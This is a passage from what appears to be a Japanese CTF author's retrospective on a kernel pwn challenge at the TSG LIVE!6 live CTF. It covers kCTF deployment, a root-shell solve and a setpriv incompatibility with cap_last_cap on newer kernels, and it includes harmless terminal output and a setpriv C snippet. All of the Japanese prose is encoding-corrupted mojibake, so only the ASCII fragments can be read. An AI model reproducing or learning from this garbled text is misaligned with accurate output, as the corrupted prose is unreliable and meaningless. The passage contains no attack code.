<p>ã¾ãšã¯ã€å‚åŠ ã—ã¦ãã ã•ã£ãŸæ–¹ã€…ã€ã¨ã‚Šã‚ã‘å¤–éƒ¨ã‚²ã‚¹ãƒˆã®æ–¹ã€…ã‚ã‚ŠãŒã¨ã†ã”ã–ã„ã¾ã—ãŸã€‚è¶…å¼·è±ªãŒå•é¡Œã‚’è§£ã„ã¦ã„ã‚‹ç”»é¢ã‚’è¦‹ã‚Œã‚‹ãªã‚“ã¦æ»…å¤šã«ãªã„ã®ã§ã€è£ã§ã‹ãªã‚Šèˆˆå¥®ã—ã¦ã„ã¾ã—ãŸã€‚</p>
<p>ç‰¹ã«pwnyaa[@pwnyaa]ã•ã‚“ãŒæ®‹ã‚Š3åˆ†ãã‚‰ã„ã§root shellã‚’å–ã£ãŸã¨ã“ã‚ã¯æ„Ÿå‹•ãƒ¢ãƒã§ã—ãŸã€‚wgetã‚’å…¥ã‚Œã¦ã„ãªã‹ã£ãŸã“ã¨ã‚„ã€ã‚µãƒ¼ãƒãŒæœ¬å½“ã®æœ€å¾Œã®æ•°åˆ†é–“ã«èª¿å­ãŒæ‚ªã‹ã£ãŸã‚‰ã—ã„ã“ã¨ã‚‚ã‚ã£ã¦è¶³ã‚’å¼•ã£å¼µã£ã¦ã—ã¾ã£ã¦ç”³ã—è¨³ãªã„ã§ã™ã€‚ã€‚ã€‚</p>
<p></p>
<p>ä»Šå›ã®ä½œå•ã¯ã€ã‚¹ãƒ†ãƒƒãƒ—ã‚’ç™»ã£ã¦ã„ãæ¥½ã—ã•ã¯å‘³ã‚ãˆã‚‹ã‚ˆã†ã«ã—ãªãŒã‚‰ã€ãƒ©ã‚¤ãƒ–ãªã®ã§å†·ãˆã™ããªã„ã‚ˆã†ã«èª¿æ•´ã™ã‚‹ã“ã¨ãŒå¤§äº‹ã ã£ãŸã¨æ€ã„ã¾ã™ã€‚æœ€åˆã¯ãã®ã‚³ãƒ³ã‚»ãƒ—ãƒˆã®ã‚‚ã¨ã«ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚‚80-90è¡Œãã‚‰ã„ã§åã¾ã‚‹ã‚ˆã†ã«ã—ã¦ã„ãŸã®ã§ã™ãŒã€ã‚ã¾ã‚Šã«ã‚‚æ„å‘³ã®ãªã„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã«ãªã‚Šã™ããŸã®ã§ãƒœãƒ„ã«ã—ã¦å¯¿å¸æ‰“ã«ã—ã¾ã—ãŸ(æœ€åˆã¯cowsayã‚’ã‚‚ã˜ã£ãŸmorasayã¨ã„ã†å•é¡Œã§ã—ãŸ)ã€‚ãã®çµæœã¨ã—ã¦100è¡Œã‚’è¶…ãˆã¦ã—ã¾ã£ãŸã®ã§ã™ãŒã€å€‹äººçš„ã«å°‘ã—é•·ã„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚ˆã‚Šã‚‚ãªã«ã‚’ã—ã¦ã„ã‚‹ã‹ã‚ã‹ã‚‰ãªã„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ã»ã†ãŒèª­ã‚€ã®è‹¦æ‰‹ãªã®ã§å¯¿å¸æ‰“ã«ãŠã¡ã¤ãã¾ã—ãŸ(ãã‚Œã§ã‚‚ãƒ¬ã‚³ãƒ¼ãƒ‰ã‚’LKMã«ä¿å­˜ã™ã‚‹ã®ã€æ„å‘³ã‚ã‹ã‚‰ã‚“ã‘ã©)ã€‚é›£æ˜“åº¦ã«é–¢ã—ã¦ã¯ã€Lv1/2ã¯ãƒ©ã‚¤ãƒ–ç”¨ã«ã—ã¾ã—ãŸãŒã€Lv3ã¯å¤–éƒ¨ç”¨ã®æŒ‘æˆ¦å•é¡Œã«ã—ã¾ã—ãŸã€‚ãŸã ã€userlandå´ã®ã‚³ãƒ¼ãƒ‰ã®å¤šã•ã‚†ãˆã«ãƒŸã‚¹ãƒªãƒ¼ãƒ‰ãŒä½•ç®‡æ‰€ã‹å­˜åœ¨ã—ã¦ã„ãŸã‚‰ã—ãã€ãã‚Œã®ã›ã„ã§æ•°åˆ†å¥ªã‚ã‚Œã¦ã—ã¾ã„è§£ããã‚Œãªã„ã¨ã„ã†äººã‚‚ã„ãŸã¨æ€ã†ã®ã§ã€ã‚„ã£ã±ã‚Šã‚·ãƒ³ãƒ—ãƒ«ã•ã¯å¤§äº‹ã ãªãã¨åçœã—ã¾ã—ãŸã€‚</p>
<p></p>
<p>ä»Šå›ã®pwnã«é–¢ã—ã¦ã¯ã€kCTFã§ãƒ‡ãƒ—ãƒ­ã‚¤ã—ã¦ã„ã¾ã™ã€‚ãŸã ã€k8sã‚ˆãã‚ã‹ã‚‰ã‚“ã®ã§ã€å®Ÿéš›ã«é‹ç”¨ã—ã¦ã„ã‚‹ã¨ãã«ãƒˆãƒ©ãƒ–ãƒ«ãŒç™ºç”Ÿã—ã¦è¿…é€Ÿã«å¯¾å¿œã§ãã‚‹ã‹ã¨è¨€ã†ã¨ã€åƒ•ã®å ´åˆã¯Noã§ã™ã€‚ã¾ãŸã€kCTFã«ã¯healthcheckã‚’è‡ªå‹•åŒ–ã—ã¦ãã‚Œã‚‹ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ãŒæœ‰ã‚‹ãŸã‚exploitã‚’healthcheckã§ãã‚‹ã‚ˆã†ãªå½¢å¼ã§æ›¸ã„ãŸã‚Šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™(ä»Šå›ã¯ãã‚“ãªã«æ‰‹é–“ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã§ã—ãŸãŒã€ä¸Šã®exploitã‚³ãƒ¼ãƒ‰ã®1/3ãã‚‰ã„ã¯å†—é•·ã ã¨æ€ã„ã¾ã™)ã€‚ä»Šå›ã‚‚healthcheckã¯èµ°ã£ã¦ãŸã‚‰ã—ã„ã§ã™ãŒã€ãªã«ã›statusãƒãƒƒã‚¸ãŒãªã„ãŸã‚ã‚ã‚“ã¾ã‚Šæ„å‘³ãŒã‚ã£ãŸã‹ã¯ã‚ã‹ã‚Šã¾ã›ã‚“ã€‚</p>
<p>ä½™è«‡ã§ã™ãŒã€kCTFã§æ¨©é™ã‚’è½ã¨ã™ã®ã«ä½¿ã‚ã‚Œã¦ã„ã‚‹setprivã§ã™ãŒã€aptãƒªãƒã‚¸ãƒˆãƒªã®setprivã‚’æœ€æ–°ã®kernelã§ä½¿ã†ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã¨ã„ã†ã®ã‚‚ã€å¤ã„setprivã¯<code>/proc/sys/kernel/cap_last_cap</code>ã‹ã‚‰å…¥æ‰‹ã—ãŸcapæ•°ã¨<code>linux/include</code>å†…ã§å®šç¾©ã•ã‚Œã¦ã„ã‚‹capæ•°ã‚’æ¯”ã¹ã¦assertã—ã¦ã„ã‚‹ã‚ˆã†ãªã®ã§ã€‚</p>

<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">a.sh</div>
<pre class="prettyprint linenums lang-sh">
wataru@skbpc:~/test/sandbox/ctf-directory/chal-sample: 15:41:59 Wed May 05
$ cat /proc/sys/kernel/cap_last_cap
39
wataru@skbpc:~/test/sandbox/ctf-directory/chal-sample: 15:42:11 Wed May 05
$ cat /usr/include/linux/capability.h | grep CAP_LAST_CAP -B5
/* Allow reading the audit log via multicast netlink socket */
#define CAP_AUDIT_READ          37
#define CAP_LAST_CAP         CAP_AUDIT_READ
</pre>
<p>æœ€æ–°ã®kernelã§ã¯CAP_BPFã¨CAP_PERFMONãŒè¿½åŠ ã•ã‚Œã¦ã„ã‚‹ãŸã‚å·®åˆ†ãŒç”Ÿã˜ã¦assertã«å¤±æ•—ã—ã¦ã—ã¾ã„ã¾ã™ã€‚æœ€æ–°ã®setprivã§ã¯<code>cap_last_cap</code>ã‚’å…¨é¢çš„ã«ä¿¡ç”¨ã™ã‚‹ã“ã¨ã«ã—ãŸã‚‰ã—ã„ã®ã§ã€å¤§ä¸ˆå¤«ãªã‚ˆã†ã§ã™ã€‚</p>

<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">a.c</div>
<pre class="prettyprint linenums lang-c">
			/* We can trust the return value from cap_last_cap(),
			 * so use that directly. */
			for (i = 0; i &lt;= cap_last_cap(); i++)
				cap_update(action, type, i);
</pre>
<p>å®Ÿéš›ã«ãƒ‡ãƒ—ãƒ­ã‚¤ã™ã‚‹ã¨ãã¯kernelã®verçš„ã«å¤§ä¸ˆå¤«ã§ã—ãŸãŒã€localã§è©¦ã™ã¨ãã«ã¯æœ€æ–°ç‰ˆã®setprivã‚’ã‚½ãƒ¼ã‚¹ã‹ã‚‰ãƒ“ãƒ«ãƒ‰ã—ã¦ä½¿ã„ã¾ã—ãŸã€‚</p>
<p></p>
<p></p>
<p></p>
<p>ã‚ã¨æ¯å›æ€ã†ã‚“ã§ã™ãŒã€pwnã®èª­ã¿æ–¹ã¯ã½ã†ã‚“ã§ã¯ãªãã±ã†ã‚“ã ã¨æ€ã„ã¾ã™ã€‚</p>
<p></p>
<p></p>
<p></p>
<p></p>
<p>ã¾ããªã«ã¯ã¨ã‚‚ã‚ã‚Œlive-ctfã‚‚çµ‚ã‚ã‚Šã§ã™ã€‚</p>
<p></p>
<p></p>
<h3>8: å‚è€ƒ</h3>
<p>1: TSG LIVE!6</p>
<p><a href='https://www.youtube.com/watch?v=oitn3AiP6bM&amp;t=14898s'>https://www.youtube.com/watch?v=oitn3AiP6bM&amp;t=14898s</a></p>
<p>2: ãƒ‹ãƒ«ã‚®ãƒª</p>
<p><a href='https://youtu.be/yvUvamhYPHw'>https://youtu.be/yvUvamhYPHw</a></p>

<p></p><p></p>
<p></p><p></p>
<p>ç¶šã...</p>
<p></p><p></p>
